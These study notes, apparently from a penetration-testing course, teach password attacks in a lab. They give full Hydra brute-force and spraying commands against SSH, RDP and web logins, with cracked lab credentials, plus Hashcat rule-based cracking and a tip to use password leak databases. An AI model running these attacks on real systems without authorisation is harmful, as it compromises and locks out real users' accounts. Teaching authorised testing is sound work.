# Password Attacks
While there are many modern approaches to user account and service authentication (such as _biometric authentication_ or _Public Key Infrastructure_), simple password authentication remains the most dominant and basic approach
+ We'll discover, reveal, and leverage passwords (and in some cases their underlying implementation components) to gain access to a user account or system
+ We'll discuss network attacks, password cracking, and attacks against Windows-based authentication implementations

## Attacking Network Services Logins 
In the last decade, _brute-force_ and dictionary attacks against publicly-exposed network services have increased dramatically
+ In fact, the common _Secure Shell_ (SSH), _Remote Desktop Protocol_ (RDP), and _Virtual Network Computing_ (VNC) services as well as web-based login forms are often attacked seconds after they are launched

Brute-force attacks attempt every possible password variation, working systematically through every combination of letters, digits and special characters
+ Although this may take a considerable amount of time depending on the length of the password and the protocol in use, these attacks could theoretically bypass any ill-protected password-based authentication system

On the other hand, dictionary attacks attempt to authenticate to services with passwords from lists of common words (_wordlists_)
+ If the correct password is not contained in the wordlist, the dictionary attack will fail

### SSH and RDP 
In this section, we'll execute dictionary attacks against the common SSH and RDP services using the open-source _THC Hydra_ tool, which can execute a broad variety of password attacks against a variety of network services and protocols
+ We'll also use the popular **rockyou.txt** wordlist, which contains over 14 million passwords. Both of these are pre-installed on our Kali machine

#### SSH
To begin, let's start the machine BRUTE (VM #1 under Resources). In the first example, we'll attack the SSH service (port 2222) on this machine, which has an IP address of 192.168.50.201
+ We'll attempt to determine the password for the user _george_

Before we start our dictionary attack, we should confirm that the target is running an SSH service on port 2222:
```
sudo nmap -sV -p 2222 192.168.50.201
```
+ Example output:
```
...
PORT   STATE SERVICE
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
```

The output indicates that SSH is open. Let's assume that through the _information gathering process_ we already discovered the _george_ user
+ It's worth noting that the format of the username also suggests that the company may use the first name of the user for account names. This information may assist us in later information gathering attempts

Next, let's prepare to use the **rockyou.txt** wordlist file
+ Since the file is compressed to save space, we must uncompress it with **gzip -d**.[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/attacking-network-services-logins/ssh-and-rdp#fn2) Finally, we can run <mark style="background: #D2B3FFA6;">hydra</mark>
```
sudo gzip -d rockyou.txt.gz
```

We'll attack a single username with **-l george**, specify the port with **-s**, indicate our password list with **-P** and define our target with **`ssh://192.168.50.201`**:
```
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -s <PORT> ssh://<IP>
```
+ Example usage:
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
+ Example output:
```
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.50.201:22/
[2222][ssh] host: 192.168.50.201   login: george   password: chocolate
1 of 1 target successfully completed, 1 valid password found
...
```

The listing shows that we successfully used Hydra to discover a valid login for the _george_ user
+ The dictionary attack worked because the password was contained in the **rockyou.txt** wordlist and we knew the name of the user we wanted to attack
+ However, if we didn't have valid usernames, we would use enumeration and information gathering techniques to find them
+ Alternatively, we could also attack built-in accounts such as _root_ (on Linux) or _Administrator_ (on Windows)

In this next example, we will attempt to use a single password against a variety of usernames in a technique known as _password spraying_
+ **NOTE**: Since there are many different ways to gain access to passwords, this is an extremely viable technique. For example, we may gain access to credentials using one of the techniques discussed later in this Module, or we may find them stored as plaintext in a file or through the use of an online password leak database. These services (such as _ScatteredSecrets_) track password leaks and compromises and sell the plaintext passwords. This can be very beneficial during a penetration test, but we must make sure we do not violate the terms of these services, we must ensure that we only use the passwords in direct cooperation with the legal owner, and we must review the service carefully to determine if it's operating legally. For example, _WeLeakInfo_ was recently seized by the FBI and U.S. Department of Justice for alleged illegal activity.

#### RDP
Let's demonstrate this scenario by executing a spray attack against the RDP service on BRUTE2
+ To do so, let's shutdown the machine BRUTE (VM #1) and start BRUTE2 (VM #2) under Resources
+ In this example, we'll assume we have already obtained a valid user password (`SuperS3cure1337#`), and we will attempt that password against a variety of potential user account names

We'll again use <mark style="background: #D2B3FFA6;">hydra</mark>, setting a list of usernames with **`-L /usr/share/wordlists/dirb/others/names.txt`** (which contains over eight thousand username entries) and a single password with **`-p "SuperS3cure1337#"`**. We'll use the RDP protocol this time and set the target with **`rdp://192.168.50.202`**:
```
hydra -L <USER_LIST> -p <PASSWORD> rdp://<IP>
```
+ Example usage and output:
```
kali@kali:~$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
[DATA] attacking rdp://192.168.50.202:3389/
...
[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
...
```
+ **NOTE**: Due to the size of the selected list, the password attack will take around 15 minutes to discover the two valid credentials. While following along, we can reduce this time by creating a list that only contains two lines, "daniel" and "justin".

In this case, we identified two usernames with the password we discovered in the database leak
+ We should always try to leverage every plaintext password we discover by spraying them against the target's systems
+ This could reveal users that use the same password across multiple systems. However, we must also use caution when leveraging broad-range attacks

Dictionary attacks generate a lot of noise in terms of logs, events, and traffic
+ While a huge amount of network traffic can bring down a network, the reactions of various security technologies could be even more undesirable
+ For example, a basic brute force protection program could lock a user's account after three failed login attempts
+ In a real-world penetration test, this could lead to a situation in which we lock users out of critical production systems
+ Before blindly launching tools, we must perform a thorough enumeration to identify and avoid these risks

### HTTP POST Login Form
In most internal and external assessments, we will face a web service
+ Depending on the service, we may not be able to interact with it until we log into it 
+ If this is our only vector and we're unable to use default credentials to log in, we should consider using a dictionary attack to gain access

Most web services come with a default user account, such as _admin_
+ Using this known username for our dictionary attack will dramatically increase our chances of success and reduce the expected duration of our attack

In this section, we'll perform a dictionary attack on the login form of the _TinyFileManager_ application, which is running on port 80 on the BRUTE web server. Let's browse to the login page:
![[Pasted image 20231102145309.png]]

After reading the application's documentation, we discover that TinyFileManager includes two default users: _admin_ and _user_
+ After trying and failing to log in with the application's default credentials, we'll attack the password of _user_ with the **rockyou.txt** wordlist

Attacking an HTTP POST login form with Hydra is not as straightforward as attacking SSH or RDP
+ We must first gather two different pieces of information:
	+ The first is the **POST data itself**, which contains the request body specifying the username and password
	+ Second, we must **capture a failed login attempt** to help Hydra differentiate between a successful and a failed login

We'll use _Burp_ to intercept a login attempt so we can grab the request body in the POST data
+ To do this, we'll first start Burp and activate intercept
+ Next, in our browser, we'll enter a username of _user_ and any password into the login form
+ The following figure shows the intercepted POST request for the login attempt
![[Pasted image 20231102145549.png]]

The highlighted area marks the request body we need to provide for Hydra in the POST request
+ Next, we need to identify a failed login attempt
+ The simplest way to do this is to forward the request or turn intercept off and check the login form in the browser
+ The following figure shows that a message appeared, which informs us that our login failed:
![[Pasted image 20231102150911.png]]
+ The highlighted text appears after a failed login attempt. We'll provide this text to Hydra as a failed login identifier
+ **NOTE**: In more complex web applications, we may need to dig deeper into the request and response or even inspect the source code of the login form to isolate a failed login indicator, but this is out of the scope of this Module

Now we can assemble the pieces to start our Hydra attack
+ As before, we'll specify `-l` for the user, `-P` for the wordlist, the target IP without any protocol, and a new `http-post-form` argument, which accepts three colon-delimited fields:
	1. The first field indicates the **location of the login form**
		+  In this demonstration, the login form is located on the **index.php** web page
	2. The second field specifies the request body used for providing a username and password to the login form, which we retrieved with Burp
	3. Finally we must provide the failed login identifier, also known as a _condition string_

Before we provide the arguments to Hydra and launch the attack, we should understand that the condition string is searched for within the response of the web application to determine if a login is successful or not
+ To reduce false positives, we should always try to avoid keywords such as _password_ or _username_
+ To do so, we can shorten the condition string appropriately

After executing the command, we'll wait a few moments for Hydra to identify a valid set of credentials, see the command below (Will need to replace the user and password variable in the `<REQUEST_BODY>` with `^USER^` and `^PASS^`):
```
hydra -l user -P <WORDLIST> <IP> http-post-form "<FORM_LOCATION>:<REQUEST_BODY>:<FAILED_LOGIN_IDENTIFIER>"
```
+ Example usage and output
```
kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.50.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 16 active
[80][http-post-form] host: 192.168.50.201   login: user   password: 121212
1 of 1 target successfully completed, 1 valid password found
...
```

In this case, our dictionary attack was successful and we identified a valid password (_121212_) for _user_. Let's try to log in to confirm the credentials
![[Pasted image 20231102151434.png]]
+ Logged in successfully

As with any dictionary attack, this generates a lot of noise and many events
+  installed, a _Web Application Firewall_ (WAF) would block this activity quickly
+ Other brute force protection applications could also block this, such as _fail2ban_, which locks a user out after a set number of failed login attempts
+ However, web services aren't often afforded this type of protection, making this is a highly effective vector against those targets

In general, dictionary attacks can be quite effective, especially if we begin with some type of known information and balance our attack in consideration of potential defense mechanisms

### HTTP Get (Basic Auth)
If a login has a request like the following, will have to do a slightly different progress
```
GET / HTTP/1.1
...
Authorization: Basic VVNFUjpQQVNT
```
+ Notice that `VVNFUjpQQVNT` is the base64 encoding of: `USER:PASS`
+ This login will often have a pop up window when you navigate to the page rather then a traditional login page

Will bruteforce this attack with the following hydra script:
```
hydra -L <USER_LIST> -P <PASSWORD_LIST> <IP> http-get "<PAGE_LOCATION>"
```
+ Example usage:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.220.201 http-get "/" -I
```

## Password Cracking Fundamentals

### Introduction to Encryption, Hashes and Cracking 
In this section, we'll examine the differences between _encryption_ and _hash algorithms_[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/password-cracking-fundamentals/introduction-to-encryption,-hashes-and-cracking#fn2) and discuss password cracking
+ Will review two popular password cracking tools: _Hashcat_ and _John the Ripper_ (JtR)
+ Will calculate the time it takes to crack certain hashes

To begin, let's discuss the basics of encryption
+ Encryption is a two-way function, in which data is "scrambled" (encrypted) or "unscrambled" (decrypted) with at least one key. Encrypted data is known as a _ciphertext_

#### Encryption
_Symmetric encryption_ algorithms use the same key for both encryption and decryption
+ To send a message to another person, both sides need to know the key (password)
+ If they exchange the key via an insecure channel, an attacker may intercept it
+ Additionally, the attacker may use a _Man-in-the-middle_ attack to gain access to the encrypted messages sent between the communication partners
+ With both the intercepted key and access to the encrypted messages, the attacker can decrypt and read them
+ This creates a huge security risk since the whole communication's security is based on the knowledge of a key, which needs to be known by both sides before starting communication
+ The _Advanced Encryption Standard_ (AES) is an example of a symmetric encryption algorithm

_Asymmetric encryption_ uses distinct key pairs containing private and public keys
+ Each user in this transaction has their own key pair
+ To receive an encrypted message, a user provides their public key to the communication partner, which they use to encrypt their message for us
+ When the message is sent, only the corresponding private key can decrypt the message
+ A common asymmetric encryption algorithm is _Rivest–Shamir–Adleman_ (RSA)

#### Hashing
On the other hand, a hash (or digest) is the result of running variable-sized input data (in this case a plaintext password) through a hash algorithm (such as _SHA1_ or _MD5_)
+ The result is a practically unique fixed-length hexadecimal value that represents the original plaintext
+ In other words, plaintext run through a specific hashing algorithm always produces the same hash and the resulting hash is (statistically) unique
+ The only exception to this is the extremely rare _hash collision_ in which two input values result in the same hash value

A majority of commonly used hash algorithms such as MD5 and SHA1 are _cryptographic hash functions_
+ These hash algorithms are _one-way functions_, meaning that it's trivial to generate a hash, but a proper algorithm's implementation makes it prohibitively difficult to get the plaintext from the hash

Hashing is often leveraged in the information security field
+ For example, if a user registers an account through an application, they set a password
+ The password is often hashed and stored in a database so that the site administrators (and attackers) can't access the plaintext password
+ When a login attempt is made, the entered password is hashed and that hash is compared to the hashed value in the database
+ If they match, the entered password is correct and the user is logged in

Within the scope of password attacks, application and user passwords are often encrypted or hashed to protect them
+ To decrypt an encrypted password we must determine the key used to encrypt it 
+ To determine the plaintext of a hashed password, we must run various plaintext passwords through the hashing algorithm and compare the returned hash to the target hash
+ These attacks are collectively known as _password cracking_, and are often performed on a dedicated system
+ Since the process can take a considerable amount of time, we often run it in parallel with other activities during a penetration test

Unlike the basic dictionary attacks against network services and login forms demonstrated in the previous Learning Unit, password cracking conserves network bandwidth, does not lock accounts and is not affected by traditional defensive technologies

We can perform basic password cracking with a simple example
+ Let's assume that we gained access to a SHA-256 password hash of `5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6` 
+ There are various ways we could have gained access to this hash, but either way we can use **sha256sum** to hash various passwords and examine the results
+ In this case, we will hash the string "secret", then hash "secret" again, and finally hash the string "secret1".
+ We'll use **echo -n** to strip the newline from our string (which would have been added to our string, modifying the hash)
```
kali@kali:~$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

kali@kali:~$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

kali@kali:~$ echo -n "secret1" | sha256sum
5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
```

In this example, we hashed "secret" twice to show that the resulting output hash is always the same
+ Notice that the hashes for the "secret" and "secret1" are completely different even though the input strings are similar
+ Also note that the hash for "secret1" matches our captured hash
+ This means that we have determined the plaintext password ("secret1") associated with that hash. Very cool

However, this is a very simple and awkward way to crack password hashes. Fortunately there are much better tools available
+ Hashcat and John the Ripper (JtR) are two of the most popular password cracking tools
+ In general, JtR is more of a CPU-based cracking tool, which also supports GPUs, while Hashcat is mainly a GPU-based cracking tool that also supports CPUs
+ JtR can be run without any additional drivers using only CPUs for password cracking. Hashcat requires _OpenCL_ or _CUDA_ for the GPU cracking process
+ For most algorithms, a GPU is much faster than a CPU since modern GPUs contain thousands of cores, each of which can share part of the workload
+ However, some slow hashing algorithms (like _bcrypt_) work better on CPUs

It's important to become familiar with different tools since they don't support the same algorithms

Before we begin cracking passwords, let's calculate the cracking time of various hash representations
+ The cracking time can be calculated by dividing the _keyspace_ with the hash rate
+ The keyspace consists of the character set to the power of the amount of characters or length of the original information (password)
+ For example, if we use the lower-case Latin alphabet (26 characters), upper case alphabet (26 characters), and the numbers from 0 to 9 (10 characters), we have a character set of 62 possible variations for every character. If we are faced with a five-character password, we are facing 62 to the power of five possible passwords containing these five characters: `62^5`

Since it's important to be able to calculate this, let's use a terminal to calculate the keyspace for a five-character password by echoing our character set to **wc** with **-c** to count every character
+ We will again specify **-n** for the echo command to strip the newline character
+ We can then use _python3_ for the calculation, with **-c** to execute the calculation and **print** to display the result
```
kali@kali:~$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
62

kali@kali:~$ python3 -c "print(62**5)"
916132832
```

For a five-character password and the specified character set, we have a keyspace of 916,132,832
+ This number determines how many unique variations can be generated for a five-character password with this character set
+ Now that we have the keyspace in the context of this example, we also need the hash rate to calculate the cracking time
+ The hash rate is a measure of how many hash calculations can be performed in a second

For find the hash rate, we can use Hashcat's benchmark mode to determine the hash rates for various hash algorithms on our particular hardware
+ We'll use **hashcat** with **-b** to initiate benchmark mode.
+ First, we'll benchmark a CPU by running it in a Kali VM without any GPUs attached
+ Following along on a local Kali system, the results may differ
```
hashcat -b
```
+ Example output:
```
hashcat (v6.2.5) starting in benchmark mode
...
* Device #1: pthread-Intel(R) Core(TM) i9-10885H CPU @ 2.40GHz, 1545/3154 MB (512 MB allocatable), 4MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........:   450.8 MH/s (2.19ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........:   298.3 MH/s (3.22ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:   134.2 MH/s (7.63ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
```

The benchmark displays hash rates for all supported modes of Hashcat
+ The listing above is shortened, since Hashcat supports many hash algorithms
+ For now, we are only interested in MD5, SHA1, and SHA-256
+ The values of the hash rates are in MH/s in which 1 MH/s equals 1,000,000 hashes per second
+ Note that results will vary on different hardware. Let's make a note of the hash rates shown in the CPU benchmark in this Listing and run a GPU benchmark so we can compare the results

For the following benchmark, we'll use a different system with an attached GPU
+ Again, we'll use the benchmark mode of Hashcat to calculate the hash rates for MD5, SHA1, and SHA-256
```
C:\Users\admin\Downloads\hashcat-6.2.5>hashcat.exe -b
hashcat (v6.2.5) starting in benchmark mode
...
* Device #1: NVIDIA GeForce RTX 3090, 23336/24575 MB, 82MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........: 68185.1 MH/s (39.99ms) @ Accel:256 Loops:1024 Thr:128 Vec:8

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
```

Let's compare our GPU and CPU hash rates:

|ALGORITHM|GPU|CPU|
|---|---|---|
|MD5|68,185.1 MH/s|450.8 MH/s|
|SHA1|21,528.2 MH/s|298.3 MH/s|
|SHA256|9,276.3 MH/s|134.2 MH/s|

This highlights the speed improvement offered by GPUs. Now that we have all values we need, let's calculate the cracking time required for our five-character password
+ In this example, we'll calculate the cracking time for SHA256 with the keyspace of 916,132,832, which we calculated previously
+ We already know that **1 MH/s equals 1,000,000 hashes per second**
+ Therefore, we can again use Python to calculate CPU and GPU cracking times
+ The first command uses the SHA-256 hash rate of the CPU calculated in Listing 7, and the second command uses the SHA-256 hash rate of the GPU calculated in Listing 8. The output format of our calculations will be in seconds:
```
kali@kali:~$ python3 -c "print(916132832 / 134200000)"
6.826623189269746

kali@kali:~$ python3 -c "print(916132832 / 9276300000)"
0.09876058687192092
```
+ The output shows that we can calculate all possible hashes for this keyspace in under one second with a GPU, and in approximately seven seconds on a CPU

Let's use the same character set but with an increased password length of 8 and 10 to get a better understanding for how cracking time scales versus password length
+ For this, we'll use the GPU hash rate for SHA-256 for our calculations
```
kali@kali:~$ python3 -c "print(62**8)"
218340105584896

kali@kali:~$ python3 -c "print(218340105584896 / 9276300000)"
23537.41314801117

kali@kali:~$ python3 -c "print(62**10)"
839299365868340224

kali@kali:~$ python3 -c "print(839299365868340224 / 9276300000)"
90477816.14095493
```

The output shows that when converted from seconds, it will take a GPU approximately 6.5 hours to attempt all possible combinations for an eight-character password, and approximately 2.8 _years_ for a ten-character password, after converting the output from seconds
+ Note that increasing password length increases cracking duration by exponential time, while increasing password complexity (charset) only increases cracking duration by _polynomial time_ 
+ This implies that a password policy encouraging longer passwords is more robust against cracking, compared to a password policy that encourages more-complex passwords

### Mutating Wordlists 
Password policies, which have grown in prevalence in recent years, dictate a minimum password length and the use of character derivations including upper and lower case letters, special characters, and numerical values
+ Most passwords in the commonly-used wordlists will not fulfill these requirements
+ We wanted to use them against a target with strong password policies, we would need to manually prepare the wordlist by removing all passwords that do not satisfy the password policy or by manually modifying the wordlist to include appropriate passwords
+ We can address this by automating the process of changing (or _mutating_) our wordlist before sending them to this target in what is known as a _rule-based attack_
+ In this type of attack, individual rules are implemented through rule functions, which are used to modify existing passwords contained in a wordlist
+ An individual rule consists of one or more rule functions
+ We will often use multiple rule functions in each rule

In order to leverage a rule-based attack, we'll create a rule file containing one or more rules and use it with a cracking tool
+ In a simple example, we could create a rule function that appends fixed characters to all passwords in a wordlist, or modifies various characters in a password

Note that rule-based attacks increase the number of attempted passwords tremendously although we now know that modern hardware can easily handle common passwords with less than eight characters

For the following example, we'll assume that we face a password policy that requires an upper case letter, a special character, and a numerical value
+ Let's check the first 10 passwords of **rockyou.txt** to determine if they fit this requirement
+ We'll use the **head** command to display the first 10 lines of the wordlist
```
kali@kali:~$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```
+ The listing shows that none of the first ten passwords of **rockyou.txt** fulfill the requirements of the password policy of this example

We could now use rule functions to mutate the wordlist to fit the password policy. But before we mutate a complex wordlist like **rockyou.txt**, let's first familiarize ourselves with rule functions and how to use them with a more basic example
+ In order to demonstrate rule functions such as capitalization, let's copy the 10 passwords from Listing 12 and save them to **demo.txt** in the newly-created **passwordattacks** directory
+ Then, we'll remove all number sequences (which don't fit the password policy) from **demo.txt** by using **sed** with **^1** referring to all lines starting with a "1", deleting them with **d**, and doing the editing in place with **-i**
```
kali@kali:~$ mkdir passwordattacks

kali@kali:~$ cd passwordattacks

kali@kali:~/passwordattacks$ head /usr/share/wordlists/rockyou.txt > demo.txt

kali@kali:~/passwordattacks$ sed -i '/^1/d' demo.txt 

kali@kali:~/passwordattacks$ cat demo.txt
password
iloveyou
princess
rockyou
abc123
```

We now have five passwords in our **demo.txt** wordlist. Let's mutate these passwords to fit the password policy, which must include a numerical value, a special character, and an uppercase letter

The _Hashcat Wiki_ (https://hashcat.net/wiki/doku.php?id=rule_based_attack) provides a list of all possible rule functions with examples
+ If we want to add a character, the simplest form is to prepend or append it 
+ We can use the **$** function to append a character or **^** to prepend a character
+ Both of these functions expect one character after the function selector
+ For example, if we want to prepend a "3" to every password in a file, the corresponding rule function would be **^3**

When generating a password with a numerical value, many users simply add a "1" at the end of an existing password
+ Therefore, let's create a rule file containing **$1** to append a "1" to all passwords in our wordlist
+ We'll create a **demo.rule** with this rule function
+ We need to escape the special character "$" to echo it into the file correctly:
```
echo \$1 > demo.rule
```

Now, we can use **hashcat** with our wordlist mutation, providing the rule file with **-r**, and **--stdout**, which starts Hashcat in debugging mode
+ In this mode, Hashcat will not attempt to crack any hashes, but merely display the mutated passwords
```
hashcat -r demo.rule --stdout demo.txt
```
+ Example output
```
password1
iloveyou1
princess1
rockyou1
abc1231
```
+ The listing shows that a "1" was appended to each password due to the rule function **$1**

Now, let's address the upper case character of the password policy
+ When forced to use an upper case character in a password, many users tend to capitalize the first character. Therefore, we'll add the **c** rule function to our rule file, which capitalizes the first character and converts the rest to lower case

Let's try an example using two rule files: **demo1.rule** and **demo2.rule**. We will format these files differently
+ In **demo1.rule**, the rule functions are on the same line separated by a space. In this case, Hashcat will use them consecutively on each password of the wordlist. The result is that the first character of each password is capitalized AND a "1" is appended to each password
+ In **demo2.rule** the rule functions are on separate lines. Hashcat interprets the second rule function, on the second line, as new rule. In this case, each rule is used separately, resulting in two mutated passwords for every password from the wordlist
```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c
       
kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

kali@kali:~/passwordattacks$ cat demo2.rule   
$1
c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```

Good! We have adapted the **demo1.rule** rule file to two of the three password policies
+ Let's work on the third and add a special character. We'll start with "!", which is a very common special character
+ Based on this assumption, we'll add **$!** to our rule file
+ Since we want all rule functions applied to every password, we need to specify the functions on the same line
+ Again, we will demonstrate this with two different rule files to stress the concept of combining rule functions
+ In the first rule file we'll add **$!** to the end of the first rule. In the second rule file we'll add it at the beginning of the rule
```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c $!

kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

kali@kali:~/passwordattacks$ cat demo2.rule   
$! $1 c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```
+ The output shows that **demo1.rule** mutates passwords by appending first the "1" and then "!". The other rule file, **demo2.rule**, appends "!" first and then the "1"
+ This shows us that the rule functions are applied from left to right in a rule

The rule contained in **demo1.rule** mutates the passwords of our wordlist to fulfill the requirements of the password policy
+ Now that we have a basic understanding of rules and how to create them, let's crack a hash with a rule-based attack
+ In this demonstration, let's assume that we retrieved the MD5 hash `f621b6c9eab51a3e2f4e167fee4c6860` from a target system
+ We'll use the **rockyou.txt** wordlist, and modify it for a password policy requiring an upper case letter, a numerical value, and a special character

Let's create a rule file to address this password policy
+ As before, we'll use the **c** rule function for the capitalization of the first letter
+ Furthermore, we also use "!" again as special character
+ For the numerical values we'll append the (ever-popular) "1", "2", and "123" followed by the special character
```
kali@kali:~/passwordattacks$ cat crackme.txt     
f621b6c9eab51a3e2f4e167fee4c6860

kali@kali:~/passwordattacks$ cat demo3.rule   
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

Next, we can run Hashcat. We will disable debugging by removing the **--stdout** argument. Instead, we'll specify **-m**, which sets the hash type
+ In this demonstration, we want to crack MD5, which is hash type **0**, which we retrieved from the Hashcat hash example page
+ After the hash type, we'll provide the target MD5 hash file (**crackme.txt**) and the **rockyou.txt** wordlist
+ Then, we'll specify **-r** to provide our **demo3.rule**. As our Kali VM doesn't have access to a GPU, we'll also enter **--force** to ignore related warnings from Hashcat
+ Usage:
```
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```
+ Example output:
```
hashcat (v6.2.5) starting
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 43033155

f621b6c9eab51a3e2f4e167fee4c6860:Computer123!            
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: f621b6c9eab51a3e2f4e167fee4c6860
Time.Started.....: Tue May 24 14:34:54 2022, (0 secs)
Time.Estimated...: Tue May 24 14:34:54 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (demo3.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3144.1 kH/s (0.28ms) @ Accel:256 Loops:3 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
...
```
+ In this case, we cracked the "Computer123!" password, which was not included in the default **rockyou.txt** file
+ This only took Hashcat a few seconds despite running on the CPU

When attempting to create rules to mutate an existing wordlist, we should always consider human behavior and convenience with regard to passwords
+ Most users use a main word and modify it to fit a password policy, perhaps appending numbers and special characters
+ When an upper case letter is required, most users capitalize the first letter
+ When special characters are required, most users add the special character at the end of the password and rely on characters on the left side of the keyboard since these digits are easy to reach and type

Instead of creating rules ourselves, we can also use rules provided by Hashcat or other sources
+ Hashcat includes a variety of effective rules in **/usr/share/hashcat/rules**:
```
kali@kali:~/passwordattacks$ ls -la /usr/share/hashcat/rules/
total 2588
-rw-r--r-- 1 root root    933 Dec 23 08:53 best64.rule
-rw-r--r-- 1 root root    666 Dec 23 08:53 combinator.rule
-rw-r--r-- 1 root root 200188 Dec 23 08:53 d3ad0ne.rule
-rw-r--r-- 1 root root 788063 Dec 23 08:53 dive.rule
-rw-r--r-- 1 root root 483425 Dec 23 08:53 generated2.rule
-rw-r--r-- 1 root root  78068 Dec 23 08:53 generated.rule
drwxr-xr-x 2 root root   4096 Feb 11 01:58 hybrid
-rw-r--r-- 1 root root 309439 Dec 23 08:53 Incisive-leetspeak.rule
-rw-r--r-- 1 root root  35280 Dec 23 08:53 InsidePro-HashManager.rule
-rw-r--r-- 1 root root  19478 Dec 23 08:53 InsidePro-PasswordsPro.rule
-rw-r--r-- 1 root root    298 Dec 23 08:53 leetspeak.rule
-rw-r--r-- 1 root root   1280 Dec 23 08:53 oscommerce.rule
-rw-r--r-- 1 root root 301161 Dec 23 08:53 rockyou-30000.rule
-rw-r--r-- 1 root root   1563 Dec 23 08:53 specific.rule
-rw-r--r-- 1 root root  64068 Dec 23 08:53 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
...
```

These predefined rules cover a broad variety of mutations and are most useful when we don't have any information about the target's password policy
+ We'll use the predefined rules in the upcoming demonstrations and examples
+ However, it's always most efficient to discover information about existing password policies, or to look up typically-used default policies for the target software environment

### Cracking Methodology
We can describe the process of cracking a hash with the following steps:
1. Extract hashes
2. Format hashes
3. Calculate the cracking time
4. Prepare wordlist
5. Attack the hash
#### Extract hashes
The first step is to extract the hashes. In a penetration test we'll find hashes in various locations. For example, if we get access to a database system, we can dump the database table containing the hashed user passwords

#### Format hashes
The next step is to format the hashes into our tool's expected cracking format. 
+ To do this we'll need to know the hashing algorithm used to create the hash. 
+ We can identify the hash type with _hash-identifier_ or _hashid_, which are installed on Kali. 
+ Depending on the hashing algorithm and the source of the hash, we may need to check if it is already in the correct format for our cracking tool. 
+ If not, then we need to use helper tools to change the representation of the hash into the expected format of our cracking tool

#### Calculate the cracking time
In the third step, we will determine the feasibility of our cracking attempt. As we discussed before, the cracking time consists of the keyspace divided by the hash rate
+ If the calculated cracking time exceeds our expected lifetime, we might reconsider this approach!

More realistically, we should consider the duration of the current penetration test considering that we are likely obliged to stop the session (along with other clean-up activity) when the test is terminated
+ Instead of holding out hope for success in an overly-long prospective cracking session, we should consider alternative attack vectors or invest in a hardware upgrade or a cloud-based machine instance

#### Prepare wordlist
The fourth step considers wordlist preparation
+ In nearly all cases we should mutate our wordlist and perform a rule-based attack, instead of a straight dictionary attack
+ In this step, we should investigate potential password policies and research other password vectors, including online password leak sites
